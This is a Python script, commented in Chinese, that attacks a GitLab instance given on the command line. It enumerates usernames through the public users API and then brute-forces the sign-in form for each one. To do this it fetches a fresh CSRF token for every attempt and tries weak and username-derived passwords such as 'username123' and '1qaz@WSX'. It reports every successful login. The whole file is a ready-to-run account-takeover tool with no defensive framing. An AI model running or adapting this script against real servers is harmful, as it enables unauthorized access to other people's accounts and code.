import requests
import sys
import time
import warnings
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 忽略不安全请求的警告
warnings.simplefilter('ignore', InsecureRequestWarning)

gitlab_url = ""
passwords = [
    "12345678",
    "123456789",
    "{{username}}123",
    "{{username}}123456",
    "{{username}}123456789",
    "1qaz@WSX"
]

def open_url(url):
    """Opens a URL and returns the response."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
    }
    return requests.get(url, headers=headers)

def find_users():
    """Finds and returns a list of user data."""
    users = []
    print("正在尝试遍历用户")
    for i in range(50):  # 限制最多请求前10个用户
        url = f"{gitlab_url}/api/v4/users/{i}"
        resdata = open_url(url)
        time.sleep(1)
        if resdata.status_code == 200:
            data = resdata.json()
            if data.get("state") == "active":
                print("发现用户:" + data["username"])
                users.append(data["username"])
            else:
                print("Block:" + data["username"])
        else:
            print(f"请求用户 {i} 失败，状态码: {resdata.status_code}")
    return users

def login(users):
    """Logs in to the website with the given users and returns the result."""
    login_url = f"{gitlab_url}/users/sign_in"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": login_url
    }

    session = requests.session()
    results = []

    for username in users:
        for password in passwords:
            time.sleep(1)  # 每次尝试之间等待1秒
            try:
                # 重新获取登录页面以获取新的 CSRF 令牌
                response = session.get(login_url, headers=headers)

                # 检查响应状态码
                if response.status_code != 200:
                    print(f"请求登录页面失败，状态码: {response.status_code}，用户名: {username}")
                    results.append((username, password, "请求登录页面失败"))
                    break  # 跳出此用户的密码尝试

                soup = BeautifulSoup(response.text, "html.parser")
                authenticity_token_input = soup.find("input", {"name": "authenticity_token"})
                
                if not authenticity_token_input:
                    print(f"未能找到 CSRF 令牌的输入字段，用户名: {username}")
                    results.append((username, password, "未找到 CSRF 令牌"))
                    break  # 跳出循环，尝试下一个用户

                authenticity_token = authenticity_token_input["value"]

                t_password = password.replace("{{username}}", username)
                data = {
                    "utf8": "✓",
                    "authenticity_token": authenticity_token,
                    "user[login]": username,
                    "user[password]": t_password,
                    "user[remember_me]": "0",
                    "commit": "Sign in",
                }

                login_response = session.post(login_url, headers=headers, data=data, allow_redirects=False)

                if "Invalid Login or password" in login_response.text:
                    print(f"尝试登录 {username} 失败。密码 {t_password} 无效。")
                    results.append((username, t_password, False))
                elif login_response.status_code == 302:
                    print(f"成功登录 {username}。密码为 {t_password}。")
                    # 清除session中的cookies
                    session.cookies.clear()
                    break  # 登录成功后跳出密码尝试循环
                else:
                    print(f"尝试登录 {username} 失败。")
                    results.append((username, t_password, False))
            except requests.exceptions.RequestException as e:
                print(f"发生错误: {e}")
                results.append((username, password, str(e)))

    return results

if __name__ == "__main__":
    if len(sys.argv) == 2:
        gitlab_url = sys.argv[1]
    else:
        print("用法: python main.py http://target.com")
        exit()

    usernames = find_users()
    print("总共发现 " + str(len(usernames)) + " 个用户")
    results = login(usernames)
    for username, password, result in results:
        if result is True:
            print(f"成功登录用户 {username}，密码为 {password}")
        elif result is False:
            print(f"登录失败用户 {username}，密码为 {password}")
        else:
            print(result)  # 打印错误信息
